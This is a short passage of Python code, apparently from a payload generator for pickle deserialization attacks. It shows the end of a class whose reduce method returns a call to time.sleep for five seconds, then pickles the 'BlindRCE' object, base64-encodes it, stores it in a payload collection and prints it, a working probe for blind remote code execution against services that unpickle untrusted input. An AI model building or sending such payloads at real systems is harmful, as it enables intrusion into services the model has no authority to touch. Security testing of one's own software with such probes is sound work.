        import time
        return (time.sleep, (5,))

blind_rce = BlindRCE()
pl_blind = base64.b64encode(pickle.dumps(blind_rce)).decode('utf-8')
payloads['blind_rce'] = pl_blind
print(f"Base64: {pl_blind}")

